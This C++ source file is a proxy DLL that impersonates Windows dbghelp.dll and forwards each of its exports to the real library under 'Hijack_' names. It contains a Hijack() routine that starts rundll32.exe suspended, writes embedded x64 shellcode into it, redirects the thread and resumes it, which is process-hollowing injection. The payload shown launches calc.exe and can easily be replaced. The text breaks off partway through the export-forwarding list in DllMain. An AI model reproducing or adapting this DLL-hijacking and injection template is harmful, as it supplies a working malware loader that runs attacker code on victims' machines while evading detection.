# include "pch.h"


# define EXTERNC extern "C"
# define NAKED __declspec(naked)
# define EXPORT EXTERNC __declspec(dllexport)
# define ALCPP EXPORT NAKED
# define ALSTD EXTERNC EXPORT NAKED void __stdcall
# define ALCFAST EXTERNC EXPORT NAKED void __fastcall
# define ALCDECL EXTERNC NAKED void __cdecl

EXTERNC 
{
		FARPROC Hijack_DbgHelpCreateUserDump;
		FARPROC Hijack_DbgHelpCreateUserDumpW;
		FARPROC Hijack_EnumDirTree;
		FARPROC Hijack_EnumDirTreeW;
		FARPROC Hijack_EnumerateLoadedModules;
		FARPROC Hijack_EnumerateLoadedModules64;
		FARPROC Hijack_EnumerateLoadedModulesEx;
		FARPROC Hijack_EnumerateLoadedModulesExW;
		FARPROC Hijack_EnumerateLoadedModulesW64;
		FARPROC Hijack_ExtensionApiVersion;
		FARPROC Hijack_FindDebugInfoFile;
		FARPROC Hijack_FindDebugInfoFileEx;
		FARPROC Hijack_FindDebugInfoFileExW;
		FARPROC Hijack_FindExecutableImage;
		FARPROC Hijack_FindExecutableImageEx;
		FARPROC Hijack_FindExecutableImageExW;
		FARPROC Hijack_FindFileInPath;
		FARPROC Hijack_FindFileInSearchPath;
		FARPROC Hijack_GetSymLoadError;
		FARPROC Hijack_GetTimestampForLoadedLibrary;
		FARPROC Hijack_ImageDirectoryEntryToData;
		FARPROC Hijack_ImageDirectoryEntryToDataEx;
		FARPROC Hijack_ImageNtHeader;
		FARPROC Hijack_ImageRvaToSection;
		FARPROC Hijack_ImageRvaToVa;
		FARPROC Hijack_ImagehlpApiVersion;
		FARPROC Hijack_ImagehlpApiVersionEx;
		FARPROC Hijack_MakeSureDirectoryPathExists;
		FARPROC Hijack_MiniDumpReadDumpStream;
		FARPROC Hijack_MiniDumpWriteDump;
		FARPROC Hijack_RangeMapAddPeImageSections;
		FARPROC Hijack_RangeMapCreate;
		FARPROC Hijack_RangeMapFree;
		FARPROC Hijack_RangeMapRead;
		FARPROC Hijack_RangeMapRemove;
		FARPROC Hijack_RangeMapWrite;
		FARPROC Hijack_RemoveInvalidModuleList;
		FARPROC Hijack_ReportSymbolLoadSummary;
		FARPROC Hijack_SearchTreeForFile;
		FARPROC Hijack_SearchTreeForFileW;
		FARPROC Hijack_SetCheckUserInterruptShared;
		FARPROC Hijack_SetSymLoadError;
		FARPROC Hijack_StackWalk;
		FARPROC Hijack_StackWalk64;
		FARPROC Hijack_StackWalkEx;
		FARPROC Hijack_SymAddSourceStream;
		FARPROC Hijack_SymAddSourceStreamA;
		FARPROC Hijack_SymAddSourceStreamW;
		FARPROC Hijack_SymAddSymbol;
		FARPROC Hijack_SymAddSymbolW;
		FARPROC Hijack_SymAddrIncludeInlineTrace;
		FARPROC Hijack_SymAllocDiaString;
		FARPROC Hijack_SymCleanup;
		FARPROC Hijack_SymCompareInlineTrace;
		FARPROC Hijack_SymDeleteSymbol;
		FARPROC Hijack_SymDeleteSymbolW;
		FARPROC Hijack_SymEnumLines;
		FARPROC Hijack_SymEnumLinesW;
		FARPROC Hijack_SymEnumProcesses;
		FARPROC Hijack_SymEnumSourceFileTokens;
		FARPROC Hijack_SymEnumSourceFiles;
		FARPROC Hijack_SymEnumSourceFilesW;
		FARPROC Hijack_SymEnumSourceLines;
		FARPROC Hijack_SymEnumSourceLinesW;
		FARPROC Hijack_SymEnumSym;
		FARPROC Hijack_SymEnumSymbols;
		FARPROC Hijack_SymEnumSymbolsEx;
		FARPROC Hijack_SymEnumSymbolsExW;
		FARPROC Hijack_SymEnumSymbolsForAddr;
		FARPROC Hijack_SymEnumSymbolsForAddrW;
		FARPROC Hijack_SymEnumSymbolsW;
		FARPROC Hijack_SymEnumTypes;
		FARPROC Hijack_SymEnumTypesByName;
		FARPROC Hijack_SymEnumTypesByNameW;
		FARPROC Hijack_SymEnumTypesW;
		FARPROC Hijack_SymEnumerateModules;
		FARPROC Hijack_SymEnumerateModules64;
		FARPROC Hijack_SymEnumerateModulesW64;
		FARPROC Hijack_SymEnumerateSymbols;
		FARPROC Hijack_SymEnumerateSymbols64;
		FARPROC Hijack_SymEnumerateSymbolsW;
		FARPROC Hijack_SymEnumerateSymbolsW64;
		FARPROC Hijack_SymFindDebugInfoFile;
		FARPROC Hijack_SymFindDebugInfoFileW;
		FARPROC Hijack_SymFindExecutableImage;
		FARPROC Hijack_SymFindExecutableImageW;
		FARPROC Hijack_SymFindFileInPath;
		FARPROC Hijack_SymFindFileInPathW;
		FARPROC Hijack_SymFreeDiaString;
		FARPROC Hijack_SymFromAddr;
		FARPROC Hijack_SymFromAddrW;
		FARPROC Hijack_SymFromIndex;
		FARPROC Hijack_SymFromIndexW;
		FARPROC Hijack_SymFromInlineContext;
		FARPROC Hijack_SymFromInlineContextW;
		FARPROC Hijack_SymFromName;
		FARPROC Hijack_SymFromNameW;
		FARPROC Hijack_SymFromToken;
		FARPROC Hijack_SymFromTokenW;
		FARPROC Hijack_SymFunctionTableAccess;
		FARPROC Hijack_SymFunctionTableAccess64;
		FARPROC Hijack_SymFunctionTableAccess64AccessRoutines;
		FARPROC Hijack_SymGetDiaSession;
		FARPROC Hijack_SymGetExtendedOption;
		FARPROC Hijack_SymGetFileLineOffsets64;
		FARPROC Hijack_SymGetHomeDirectory;
		FARPROC Hijack_SymGetHomeDirectoryW;
		FARPROC Hijack_SymGetLineFromAddr;
		FARPROC Hijack_SymGetLineFromAddr64;
		FARPROC Hijack_SymGetLineFromAddrEx;
		FARPROC Hijack_SymGetLineFromAddrW64;
		FARPROC Hijack_SymGetLineFromInlineContext;
		FARPROC Hijack_SymGetLineFromInlineContextW;
		FARPROC Hijack_SymGetLineFromName;
		FARPROC Hijack_SymGetLineFromName64;
		FARPROC Hijack_SymGetLineFromNameEx;
		FARPROC Hijack_SymGetLineFromNameW64;
		FARPROC Hijack_SymGetLineNext;
		FARPROC Hijack_SymGetLineNext64;
		FARPROC Hijack_SymGetLineNextEx;
		FARPROC Hijack_SymGetLineNextW64;
		FARPROC Hijack_SymGetLinePrev;
		FARPROC Hijack_SymGetLinePrev64;
		FARPROC Hijack_SymGetLinePrevEx;
		FARPROC Hijack_SymGetLinePrevW64;
		FARPROC Hijack_SymGetModuleBase;
		FARPROC Hijack_SymGetModuleBase64;
		FARPROC Hijack_SymGetModuleInfo;
		FARPROC Hijack_SymGetModuleInfo64;
		FARPROC Hijack_SymGetModuleInfoW;
		FARPROC Hijack_SymGetModuleInfoW64;
		FARPROC Hijack_SymGetOmapBlockBase;
		FARPROC Hijack_SymGetOmaps;
		FARPROC Hijack_SymGetOptions;
		FARPROC Hijack_SymGetScope;
		FARPROC Hijack_SymGetScopeW;
		FARPROC Hijack_SymGetSearchPath;
		FARPROC Hijack_SymGetSearchPathW;
		FARPROC Hijack_SymGetSourceFile;
		FARPROC Hijack_SymGetSourceFileChecksum;
		FARPROC Hijack_SymGetSourceFileChecksumW;
		FARPROC Hijack_SymGetSourceFileFromToken;
		FARPROC Hijack_SymGetSourceFileFromTokenW;
		FARPROC Hijack_SymGetSourceFileToken;
		FARPROC Hijack_SymGetSourceFileTokenW;
		FARPROC Hijack_SymGetSourceFileW;
		FARPROC Hijack_SymGetSourceVarFromToken;
		FARPROC Hijack_SymGetSourceVarFromTokenW;
		FARPROC Hijack_SymGetSymFromAddr;
		FARPROC Hijack_SymGetSymFromAddr64;
		FARPROC Hijack_SymGetSymFromName;
		FARPROC Hijack_SymGetSymFromName64;
		FARPROC Hijack_SymGetSymNext;
		FARPROC Hijack_SymGetSymNext64;
		FARPROC Hijack_SymGetSymPrev;
		FARPROC Hijack_SymGetSymPrev64;
		FARPROC Hijack_SymGetSymbolFile;
		FARPROC Hijack_SymGetSymbolFileW;
		FARPROC Hijack_SymGetTypeFromName;
		FARPROC Hijack_SymGetTypeFromNameW;
		FARPROC Hijack_SymGetTypeInfo;
		FARPROC Hijack_SymGetTypeInfoEx;
		FARPROC Hijack_SymGetUnwindInfo;
		FARPROC Hijack_SymInitialize;
		FARPROC Hijack_SymInitializeW;
		FARPROC Hijack_SymLoadModule;
		FARPROC Hijack_SymLoadModule64;
		FARPROC Hijack_SymLoadModuleEx;
		FARPROC Hijack_SymLoadModuleExW;
		FARPROC Hijack_SymMatchFileName;
		FARPROC Hijack_SymMatchFileNameW;
		FARPROC Hijack_SymMatchString;
		FARPROC Hijack_SymMatchStringA;
		FARPROC Hijack_SymMatchStringW;
		FARPROC Hijack_SymNext;
		FARPROC Hijack_SymNextW;
		FARPROC Hijack_SymPrev;
		FARPROC Hijack_SymPrevW;
		FARPROC Hijack_SymQueryInlineTrace;
		FARPROC Hijack_SymRefreshModuleList;
		FARPROC Hijack_SymRegisterCallback;
		FARPROC Hijack_SymRegisterCallback64;
		FARPROC Hijack_SymRegisterCallbackW64;
		FARPROC Hijack_SymRegisterFunctionEntryCallback;
		FARPROC Hijack_SymRegisterFunctionEntryCallback64;
		FARPROC Hijack_SymSearch;
		FARPROC Hijack_SymSearchW;
		FARPROC Hijack_SymSetContext;
		FARPROC Hijack_SymSetDiaSession;
		FARPROC Hijack_SymSetExtendedOption;
		FARPROC Hijack_SymSetHomeDirectory;
		FARPROC Hijack_SymSetHomeDirectoryW;
		FARPROC Hijack_SymSetOptions;
		FARPROC Hijack_SymSetParentWindow;
		FARPROC Hijack_SymSetScopeFromAddr;
		FARPROC Hijack_SymSetScopeFromIndex;
		FARPROC Hijack_SymSetScopeFromInlineContext;
		FARPROC Hijack_SymSetSearchPath;
		FARPROC Hijack_SymSetSearchPathW;
		FARPROC Hijack_SymSrvDeltaName;
		FARPROC Hijack_SymSrvDeltaNameW;
		FARPROC Hijack_SymSrvGetFileIndexInfo;
		FARPROC Hijack_SymSrvGetFileIndexInfoW;
		FARPROC Hijack_SymSrvGetFileIndexString;
		FARPROC Hijack_SymSrvGetFileIndexStringW;
		FARPROC Hijack_SymSrvGetFileIndexes;
		FARPROC Hijack_SymSrvGetFileIndexesW;
		FARPROC Hijack_SymSrvGetSupplement;
		FARPROC Hijack_SymSrvGetSupplementW;
		FARPROC Hijack_SymSrvIsStore;
		FARPROC Hijack_SymSrvIsStoreW;
		FARPROC Hijack_SymSrvStoreFile;
		FARPROC Hijack_SymSrvStoreFileW;
		FARPROC Hijack_SymSrvStoreSupplement;
		FARPROC Hijack_SymSrvStoreSupplementW;
		FARPROC Hijack_SymUnDName;
		FARPROC Hijack_SymUnDName64;
		FARPROC Hijack_SymUnloadModule;
		FARPROC Hijack_SymUnloadModule64;
		FARPROC Hijack_UnDecorateSymbolName;
		FARPROC Hijack_UnDecorateSymbolNameW;
		FARPROC Hijack_WinDbgExtensionDllInit;
		FARPROC Hijack__EFN_DumpImage;
		FARPROC Hijack_block;
		FARPROC Hijack_chksym;
		FARPROC Hijack_dbghelp;
		FARPROC Hijack_dh;
		FARPROC Hijack_fptr;
		FARPROC Hijack_homedir;
		FARPROC Hijack_inlinedbg;
		FARPROC Hijack_itoldyouso;
		FARPROC Hijack_lmi;
		FARPROC Hijack_lminfo;
		FARPROC Hijack_omap;
		FARPROC Hijack_optdbgdump;
		FARPROC Hijack_optdbgdumpaddr;
		FARPROC Hijack_srcfiles;
		FARPROC Hijack_stack_force_ebp;
		FARPROC Hijack_stackdbg;
		FARPROC Hijack_sym;
		FARPROC Hijack_symsrv;
		FARPROC Hijack_vc7fpo;

}

namespace DLLHijacker
{
    HMODULE m_hModule = NULL;
    DWORD m_dwReturn[17] = {0};

    inline BOOL WINAPI Load()
    {
        TCHAR tzPath[MAX_PATH];
        lstrcpy(tzPath, TEXT("C:\\Windows\\System32\\dbghelp.dll"));
        m_hModule = LoadLibrary(tzPath);
        if (m_hModule == NULL)
            return FALSE;
        return (m_hModule != NULL);
    }

    FARPROC WINAPI GetAddress(PCSTR pszProcName)
    {
        FARPROC fpAddress;
        CHAR szProcName[16];
        fpAddress = GetProcAddress(m_hModule, pszProcName);
        if (fpAddress == NULL)
        {
            if (HIWORD(pszProcName) == 0)
            {
                wsprintf((LPWSTR)szProcName, L"%d", pszProcName);
                pszProcName = szProcName;
            }
            ExitProcess(-2);
        }
        return fpAddress;
    }
}

using namespace DLLHijacker;

VOID Hijack()   //default open a calc.
{   
    unsigned char shellcode_calc[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
		"\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
		"\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
		"\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
		"\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
		"\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
		"\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
		"\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
		"\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
		"\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
		"\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
		"\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
		"\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
		"\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
		"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
		"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
		"\x63\x2e\x65\x78\x65\x00";

  TCHAR CommandLine[] = TEXT("c:\\windows\\system32\\rundll32.exe");

	CONTEXT Context; // [sp+0h] [bp-324h]@2
	struct _STARTUPINFOA StartupInfo; // [sp+2CCh] [bp-58h]@1
	struct _PROCESS_INFORMATION ProcessInformation; // [sp+310h] [bp-14h]@1
	LPVOID lpBaseAddress; // [sp+320h] [bp-4h]@    

	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	StartupInfo.cb = 104;
	if (CreateProcess(0, CommandLine, 0, 0, 0, 0x44, 0, 0, (LPSTARTUPINFOW)&StartupInfo, &ProcessInformation)) {
		Context.ContextFlags = 1048579;
		GetThreadContext(ProcessInformation.hThread, &Context);
		lpBaseAddress = VirtualAllocEx(ProcessInformation.hProcess, 0, 0x800u, 0x1000u, 0x40u);
		WriteProcessMemory(ProcessInformation.hProcess, lpBaseAddress, &shellcode_calc, 0x800u, 0);
		Context.Rip = (DWORD64)lpBaseAddress;
		SetThreadContext(ProcessInformation.hThread, &Context);
		ResumeThread(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hThread);
		CloseHandle(ProcessInformation.hProcess);
	}
}


BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        DisableThreadLibraryCalls(hModule);
        if(Load())
        {
            Hijack_DbgHelpCreateUserDump = GetAddress("DbgHelpCreateUserDump");
			Hijack_DbgHelpCreateUserDumpW = GetAddress("DbgHelpCreateUserDumpW");
			Hijack_EnumDirTree = GetAddress("EnumDirTree");
			Hijack_EnumDirTreeW = GetAddress("EnumDirTreeW");
			Hijack_EnumerateLoadedModules = GetAddress("EnumerateLoadedModules");
			Hijack_EnumerateLoadedModules64 = GetAddress("EnumerateLoadedModules64");
			Hijack_EnumerateLoadedModulesEx = GetAddress("EnumerateLoadedModulesEx");
			Hijack_EnumerateLoadedModulesExW = GetAddress("EnumerateLoadedModulesExW");
			Hijack_EnumerateLoadedModulesW64 = GetAddress("EnumerateLoadedModulesW64");
			Hijack_ExtensionApiVersion = GetAddress("ExtensionApiVersion");
			Hijack_FindDebugInfoFile = GetAddress("FindDebugInfoFile");
			Hijack_FindDebugInfoFileEx = GetAddress("FindDebugInfoFileEx");
			Hijack_FindDebugInfoFileExW = GetAddress("FindDebugInfoFileExW");
			Hijack_FindExecutableImage = GetAddress("FindExecutableImage");
			Hijack_FindExecutableImageEx = GetAddress("FindExecutableImageEx");
			Hijack_FindExecutableImageExW = GetAddress("FindExecutableImageExW");
			Hijack_FindFileInPath = GetAddress("FindFileInPath");
			Hijack_FindFileInSearchPath = GetAddress("FindFileInSearchPath");
			Hijack_GetSymLoadError = GetAddress("GetSymLoadError");
			Hijack_GetTimestampForLoadedLibrary = GetAddress("GetTimestampForLoadedLibrary");
			Hijack_ImageDirectoryEntryToData = GetAddress("ImageDirectoryEntryToData");
			Hijack_ImageDirectoryEntryToDataEx = GetAddress("ImageDirectoryEntryToDataEx");
			Hijack_ImageNtHeader = GetAddress("ImageNtHeader");
			Hijack_ImageRvaToSection = GetAddress("ImageRvaToSection");
			Hijack_ImageRvaToVa = GetAddress("ImageRvaToVa");
			Hijack_ImagehlpApiVersion = GetAddress("ImagehlpApiVersion");
			Hijack_ImagehlpApiVersionEx = GetAddress("ImagehlpApiVersionEx");
			Hijack_MakeSureDirectoryPathExists = GetAddress("MakeSureDirectoryPathExists");
			Hijack_MiniDumpReadDumpStream = GetAddress("MiniDumpReadDumpStream");
			Hijack_MiniDumpWriteDump = GetAddress("MiniDumpWriteDump");
			Hijack_RangeMapAddPeImageSections = GetAddress("RangeMapAddPeImageSections");
			Hijack_RangeMapCreate = GetAddress("RangeMapCreate");
			Hijack_RangeMapFree = GetAddress("RangeMapFree");
			Hijack_RangeMapRead = GetAddress("RangeMapRead");
			Hijack_RangeMapRemove = GetAddress("RangeMapRemove");
			Hijack_RangeMapWrite = GetAddress("RangeMapWrite");
			Hijack_RemoveInvalidModuleList = GetAddress("RemoveInvalidModuleList");
			Hijack_ReportSymbolLoadSummary = GetAddress("ReportSymbolLoadSummary");
			Hijack_SearchTreeForFile = GetAddress("SearchTreeForFile");
			Hijack_SearchTreeForFileW = GetAddress("SearchTreeForFileW");
			Hijack_SetCheckUserInterruptShared = GetAddress("SetCheckUserInterruptShared");
			Hijack_SetSymLoadError = GetAddress("SetSymLoadError");
			Hijack_StackWalk = GetAddress("StackWalk");
			Hijack_StackWalk64 = GetAddress("StackWalk64");
			Hijack_StackWalkEx = GetAddress("StackWalkEx");
			Hijack_SymAddSourceStream = GetAddress("SymAddSourceStream");
			Hijack_SymAddSourceStreamA = GetAddress("SymAddSourceStreamA");
			Hijack_SymAddSourceStreamW = GetAddress("SymAddSourceStreamW");
			Hijack_SymAddSymbol = GetAddress("SymAddSymbol");
			Hijack_SymAddSymbolW = GetAddress("SymAddSymbolW");
			Hijack_SymAddrIncludeInlineTrace = GetAddress("SymAddrIncludeInlineTrace");
			Hijack_SymAllocDiaString = GetAddress("SymAllocDiaString");
			Hijack_SymCleanup = GetAddress("SymCleanup");
			Hijack_SymCompareInlineTrace = GetAddress("SymCompareInlineTrace");
			Hijack_SymDeleteSymbol = GetAddress("SymDeleteSymbol");
			Hijack_SymDeleteSymbolW = GetAddress("SymDeleteSymbolW");
			Hijack_SymEnumLines = GetAddress("SymEnumLines");
			Hijack_SymEnumLinesW = GetAddress("SymEnumLinesW");
			Hijack_SymEnumProcesses = GetAddress("SymEnumProcesses");
			Hijack_SymEnumSourceFileTokens = GetAddress("SymEnumSourceFileTokens");
			Hijack_SymEnumSourceFiles = GetAddress("SymEnumSourceFiles");
			Hijack_SymEnumSourceFilesW = GetAddress("SymEnumSourceFilesW");
			Hijack_SymEnumSourceLines = GetAddress("SymEnumSourceLines");
			Hijack_SymEnumSourceLinesW = GetAddress("SymEnumSourceLinesW");
			Hijack_SymEnumSym = GetAddress("SymEnumSym");
			Hijack_SymEnumSymbols = GetAddress("SymEnumSymbols");
			Hijack_SymEnumSymbolsEx = GetAddress("SymEnumSymbolsEx");
			Hijack_SymEnumSymbolsExW = GetAddress("SymEnumSymbolsExW");
			Hijack_SymEnumSymbolsForAddr = GetAddress("SymEnumSymbolsForAddr");
			Hijack_SymEnumSymbolsForAddrW = GetAddress("SymEnumSymbolsForAddrW");
			Hijack_SymEnumSymbolsW = GetAddress("SymEnumSymbolsW");
			Hijack_SymEnumTypes = GetAddress("SymEnumTypes");
			Hijack_SymEnumTypesByName = GetAddress("SymEnumTypesByName");
			Hijack_SymEnumTypesByNameW = GetAddress("SymEnumTypesByNameW");
			Hijack_SymEnumTypesW = GetAddress("SymEnumTypesW");
			Hijack_SymEnumerateModules = GetAddress("SymEnumerateModules");
			Hijack_SymEnumerateModules64 = GetAddress("SymEnumerateModules64");
			Hijack_SymEnumerateModulesW64 = GetAddress("SymEnumerateModulesW64");
			Hijack_SymEnumerateSymbols = GetAddress("SymEnumerateSymbols");
			Hijack_SymEnumerateSymbols64 = GetAddress("SymEnumerateSymbols64");
			Hijack_SymEnumerateSymbolsW = GetAddress("SymEnumerateSymbolsW");
			Hijack_SymEnumerateSymbolsW64 = GetAddress("SymEnumerateSymbolsW64");
			Hijack_SymFindDebugInfoFile = GetAddress("SymFindDebugInfoFile");
			Hijack_SymFindDebugInfoFileW = GetAddress("SymFindDebugInfoFileW");
			Hijack_SymFindExecutableImage = GetAddress("SymFindExecutableImage");
			Hijack_SymFindExecutableImageW = GetAddress("SymFindExecutableImageW");
			Hijack_SymFindFileInPath = GetAddress("SymFindFileInPath");
			Hijack_SymFindFileInPathW = GetAddress("SymFindFileInPathW");
			Hijack_SymFreeDiaString = GetAddress("SymFreeDiaString");
			Hijack_SymFromAddr = GetAddress("SymFromAddr");
			Hijack_SymFromAddrW = GetAddress("SymFromAddrW");
			Hijack_SymFromIndex = GetAddress("SymFromIndex");
			Hijack_SymFromIndexW = GetAddress("SymFromIndexW");
			Hijack_SymFromInlineContext = GetAddress("SymFromInlineContext");
			Hijack_SymFromInlineContextW = GetAddress("SymFromInlineContextW");
			Hijack_SymFromName = GetAddress("SymFromName");
			Hijack_SymFromNameW = GetAddress("SymFromNameW");
			Hijack_SymFromToken = GetAddress("SymFromToken");
			Hijack_SymFromTokenW = GetAddress("SymFromTokenW");
			Hijack_SymFunctionTableAccess = GetAddress("SymFunctionTableAccess");
			Hijack_SymFunctionTableAccess64 = GetAddress("SymFunctionTableAccess64");
			Hijack_SymFunctionTableAccess64AccessRoutines = GetAddress("SymFunctionTableAccess64AccessRoutines");
			Hijack_SymGetDiaSession = GetAddress("SymGetDiaSession");
			Hijack_SymGetExtendedOption = GetAddress("SymGetExtendedOption");
			Hijack_SymGetFileLineOffsets64 = GetAddress("SymGetFileLineOffsets64");
			Hijack_SymGetHomeDirectory = GetAddress("SymGetHomeDirectory");
			Hijack_SymGetHomeDirectoryW = GetAddress("SymGetHomeDirectoryW");
			Hijack_SymGetLineFromAddr = GetAddress("SymGetLineFromAddr");
			Hijack_SymGetLineFromAddr64 = GetAddress("SymGetLineFromAddr64");
			Hijack_SymGetLineFromAddrEx = GetAddress("SymGetLineFromAddrEx");
			Hijack_SymGetLineFromAddrW64 = GetAddress("SymGetLineFromAddrW64");
			Hijack_SymGetLineFromInlineContext = GetAddress("SymGetLineFromInlineContext");
			Hijack_SymGetLineFromInlineContextW = GetAddress("SymGetLineFromInlineContextW");
			Hijack_SymGetLineFromName = GetAddress("SymGetLineFromName");
			Hijack_SymGetLineFromName64 = GetAddress("SymGetLineFromName64");
			Hijack_SymGetLineFromNameEx = GetAddress("SymGetLineFromNameEx");
			Hijack_SymGetLineFromNameW64 = GetAddress("SymGetLineFromNameW64");
			Hijack_SymGetLineNext = GetAddress("SymGetLineNext");
			Hijack_SymGetLineNext64 = GetAddress("SymGetLineNext64");
			Hijack_SymGetLineNextEx = GetAddress("SymGetLineNextEx");
			Hijack_SymGetLineNextW64 = GetAddress("SymGetLineNextW64");
			Hijack_SymGetLinePrev = GetAddress("SymGetLinePrev");
			Hijack_SymGetLinePrev64 = GetAddress("SymGetLinePrev64");
			Hijack_SymGetLinePrevEx = GetAddress("SymGetLinePrevEx");
			Hijack_SymGetLinePrevW64 = GetAddress("SymGetLinePrevW64");
			Hijack_SymGetModuleBase = GetAddress("SymGetModuleBase");
			Hijack_SymGetModuleBase64 = GetAddress("SymGetModuleBase64");
			Hijack_SymGetModuleInfo = GetAddress("SymGetModuleInfo");
			Hijack_SymGetModuleInfo64 = GetAddress("SymGetModuleInfo64");
			Hijack_SymGetModuleInfoW = GetAddress("SymGetModuleInfoW");
			Hijack_SymGetModuleInfoW64 = GetAddress("SymGetModuleInfoW64");
			Hijack_SymGetOmapBlockBase = GetAddress("SymGetOmapBlockBase");
			Hijack_SymGetOmaps = GetAddress("SymGetOmaps");
			Hijack_SymGetOptions = GetAddress("SymGetOptions");
			Hijack_SymGetScope = GetAddress("SymGetScope");
			Hijack_SymGetScopeW = GetAddress("SymGetScopeW");
			Hijack_SymGetSearchPath = GetAddress("SymGetSearchPath");
			Hijack_SymGetSearchPathW = GetAddress("SymGetSearchPathW");
			Hijack_SymGetSourceFile = GetAddress("SymGetSourceFile");
			Hijack_SymGetSourceFileChecksum = GetAddress("SymGetSourceFileChecksum");
			Hijack_SymGetSourceFileChecksumW = GetAddress("SymGetSourceFileChecksumW");
			Hijack_SymGetSourceFileFromToken = GetAddress("SymGetSourceFileFromToken");
			Hijack_SymGetSourceFileFromTokenW = GetAddress("SymGetSourceFileFromTokenW");
			Hijack_SymGetSourceFileToken = GetAddress("SymGetSourceFileToken");
			Hijack_SymGetSourceFileTokenW = GetAddress("SymGetSourceFileTokenW");
			Hijack_SymGetSourceFileW = GetAddress("SymGetSourceFileW");
			Hijack_SymGetSourceVarFromToken = GetAddress("SymGetSourceVarFromToken");
			Hijack_SymGetSourceVarFromTokenW = GetAddress("SymGetSourceVarFromTokenW");
			Hijack_SymGetSymFromAddr = GetAddress("SymGetSymFromAddr");
			Hijack_SymGetSymFromAddr64 = GetAddress("SymGetSymFromAddr64");
			Hijack_SymGetSymFromName = GetAddress("SymGetSymFromName");
			Hijack_SymGetSymFromName64 = GetAddress("SymGetSymFromName64");
			Hijack_SymGetSymNext = GetAddress("SymGetSymNext");
			Hijack_SymGetSymNext64 = GetAddress("SymGetSymNext64");
			Hijack_SymGetSymPrev = GetAddress("SymGetSymPrev");
			Hijack_SymGetSymPrev64 = GetAddress("SymGetSymPrev64");
			Hijack_SymGetSymbolFile = GetAddress("SymGetSymbolFile");
			Hijack_SymGetSymbolFileW = GetAddress("SymGetSymbolFileW");
			Hijack_SymGetTypeFromName = GetAddress("SymGetTypeFromName");
			Hijack_SymGetTypeFromNameW = GetAddress("SymGetTypeFromNameW");
			Hijack_SymGetTypeInfo = GetAddress("SymGetTypeInfo");
			Hijack_SymGetTypeInfoEx = GetAddress("SymGetTypeInfoEx");
			Hijack_SymGetUnwindInfo = GetAddress("SymGetUnwindInfo");
			Hijack_SymInitialize = GetAddress("SymInitialize");
			Hijack_SymInitializeW = GetAddress("SymInitializeW");
			Hijack_SymLoadModule = GetAddress("SymLoadModule");
			Hijack_SymLoadModule64 = GetAddress("SymLoadModule64");
			Hijack_SymLoadModuleEx = GetAddress("SymLoadModuleEx");
			Hijack_SymLoadModuleExW = GetAddress("SymLoadModuleExW");
			Hijack_SymMatchFileName = GetAddress("SymMatchFileName");
			Hijack_SymMatchFileNameW = GetAddress("SymMatchFileNameW");
			Hijack_SymMatchString = GetAddress("SymMatchString");
			Hijack_SymMatchStringA = GetAddress("SymMatchStringA");
			Hijack_SymMatchStringW = GetAddress("SymMatchStringW");
			Hijack_SymNext = GetAddress("SymNext");
			Hijack_SymNextW = GetAddress("SymNextW");
			Hijack_SymPrev = GetAddress("SymPrev");
			Hijack_SymPrevW = GetAddress("SymPrevW");
			Hijack_SymQueryInlineTrace = GetAddress("SymQueryInlineTrace");
			Hijack_SymRefreshModuleList = GetAddress("SymRefreshModuleList");
			Hijack_SymRegisterCallback = GetAddress("SymRegisterCallback");
			Hijack_SymRegisterCallback64 = GetAddress("SymRegisterCallback64");
			Hijack_SymRegisterCallbackW64 = GetAddress("SymRegisterCallbackW64");
			Hijack_SymRegisterFunctionEntryCallback = GetAddress("SymRegisterFunctionEntryCallback");
			Hijack_SymRegisterFunctionEntryCallback64 = GetAddress("SymRegisterFunctionEntryCallback64");
			Hijack_SymSearch = GetAddress("SymSearch");
			Hijack_SymSearchW = GetAddress("SymSearchW");
			Hijack_SymSetContext = GetAddress("SymSetContext");
			Hijack_SymSetDiaSession = GetAddress("SymSetDiaSession");
			Hijack_SymSetExtendedOption = GetAddress("SymSetExtendedOption");
			Hijack_SymSetHomeDirectory = GetAddress("SymSetHomeDirectory");
			Hijack_SymSetHomeDirectoryW = GetAddress("SymSetHomeDirectoryW");
			Hijack_SymSetOptions = GetAddress("SymSetOptions");
			Hijack_SymSetParentWindow = GetAddress("SymSetParentWindow");
			Hijack_SymSetScopeFromAddr = GetAddress("SymSetScopeFromAddr");
			Hijack_SymSetScopeFromIndex = GetAddress("SymSetScopeFromIndex");
			Hijack_SymSetScopeFromInlineContext = GetAddress("SymSetScopeFromInlineContext");
			Hijack_SymSetSearchPath = GetAddress("SymSetSearchPath");
			Hijack_SymSetSearchPathW = GetAddress("SymSetSearchPathW");
			Hijack_SymSrvDeltaName = GetAddress("SymSrvDeltaName");
